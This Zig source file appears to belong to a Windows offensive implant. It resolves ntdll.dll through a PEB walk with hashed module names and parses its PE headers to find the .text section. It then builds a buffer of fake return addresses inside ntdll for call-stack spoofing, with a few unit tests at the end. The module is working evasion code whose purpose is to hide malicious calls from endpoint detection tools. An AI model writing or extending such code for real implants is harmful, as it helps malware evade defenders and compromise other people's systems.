const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");

pub const FAKE_FRAME_DEPTH: usize = 4;

pub export var fake_frame_buffer: [FAKE_FRAME_DEPTH]usize = undefined;

var ntdll_text_start: usize = 0;
var ntdll_text_end: usize = 0;

const TextBounds = struct { start: usize, end: usize };

fn getTextSectionBounds(base: types.PVOID) ?TextBounds {
    const bp: [*]u8 = @ptrCast(@alignCast(base));
    const dos: *types.IMAGE_DOS_HEADER = @ptrCast(@alignCast(bp));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;
    const nt_off: usize = @intCast(dos.e_lfanew);
    const nt: *types.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(bp + nt_off));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;
    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(bp + sec_off));
    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return TextBounds{ .start = @intFromPtr(bp) + s.VirtualAddress, .end = @intFromPtr(bp) + s.VirtualAddress + s.Misc.VirtualSize };
        }
    }
    return null;
}

pub fn initialize() bool {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return false;
    const bounds = getTextSectionBounds(ntdll) orelse return false;
    ntdll_text_start = bounds.start;
    ntdll_text_end = bounds.end;
    const range = bounds.end - bounds.start;
    if (range < 0x100) return false;
    for (0..FAKE_FRAME_DEPTH) |i| {
        const stride = range / (FAKE_FRAME_DEPTH + 1);
        const offset = (stride * @as(usize, @intCast(i + 1))) & ~@as(usize, 0xF);
        fake_frame_buffer[i] = bounds.start + @min(offset, range - 0x10);
    }
    return true;
}

pub fn isValidNtdllAddress(addr: usize) bool {
    if (ntdll_text_start == 0) return false;
    return addr >= ntdll_text_start and addr < ntdll_text_end;
}

test "fake addresses are within ntdll range" {
    try std.testing.expect(FAKE_FRAME_DEPTH == 4);
}

test "fake frame buffer initialized correctly" {
    if (@import("builtin").os.tag == .windows) {
        const ok = initialize();
        try std.testing.expect(ok);
        for (fake_frame_buffer, 0..) |addr, i| {
            try std.testing.expect(addr != 0);
            try std.testing.expect(isValidNtdllAddress(addr));
            _ = i;
        }
    }
}

test "stack_spoof initialize without crash" {
    if (@import("builtin").os.tag == .windows) {
        _ = initialize();
    }
}
